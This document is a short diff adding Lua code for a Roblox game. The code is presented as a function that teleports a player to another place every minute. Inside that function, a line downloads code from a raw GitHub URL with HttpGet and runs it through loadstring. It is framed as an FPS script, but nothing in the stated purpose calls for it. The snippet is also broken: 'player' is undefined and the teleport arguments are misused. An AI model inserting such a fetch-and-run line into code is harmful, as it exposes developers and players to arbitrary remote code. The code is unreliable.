@@ -1,3 +1,24 @@
+-- Define a function to teleport the player
+function teleportPlayer(player)
+    -- Replace the value of "placeId" with the ID of the destination game
+    local placeId = 4490140733
+    -- Replace the value of "spawnName" with the name of the spawn location in the destination game
+    local spawnName = "SpawnLocation"
+
+    -- Use the TeleportService to teleport the player to the destination game
+    game:GetService("TeleportService"):Teleport(placeId, player, game:GetService("ServerStorage"):FindFirstChild(spawnName))
+
+    local fpsScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/Commandragon/Not-mine/main/code"))
+    fpsScript()
+end
+
+-- Call the teleportPlayer function every minute
+while true do
+    wait(60) -- Wait for 60 seconds
+    -- Replace "player" with the actual player object that you want to teleport
+    teleportPlayer(player)
+end
+
 local fpsBoost = fpsBoost or false
 
 
